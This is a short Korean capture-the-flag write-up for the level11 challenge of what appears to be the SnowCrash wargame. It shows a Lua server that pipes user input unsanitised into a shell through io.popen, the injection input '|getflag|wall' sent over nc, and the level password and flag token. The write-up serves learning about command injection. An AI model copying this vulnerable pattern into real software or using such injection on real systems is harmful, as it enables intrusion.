> Password: feulo4b72j7edeahuete3no7c

# 접근 방법

홈 디렉토리에 있는 `level11.lua`를 보면

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end

while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

`5151`번 포트에서 비밀번호를 입력받고 그 비밀번호의 `sha1 hash`와 하드코딩 된 `hash`를 비교하여 결과에 따라서 메시지를 출력하는 프로그램인 것을 알 수 있다.

이때 `sha1 hash`를 구하는 과정에서

```lua
prog = io.popen("echo "..pass.." | sha1sum", "r")
```

입력된 비밀번호를 별다른 확인 없이 쉘에서 평가하는 것을 볼 수 있다.

따라서 비밀번호로 `|getflag|wall`와 같은 문자열을 입력하면 `flag`를 얻을 수 있다.

```bash
$ nc 127.0.0.1 5151
Password: |getflag|wall

Broadcast Message from flag11@Snow
        (somewhere) at 22:02 ...

Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

Erf nope..
```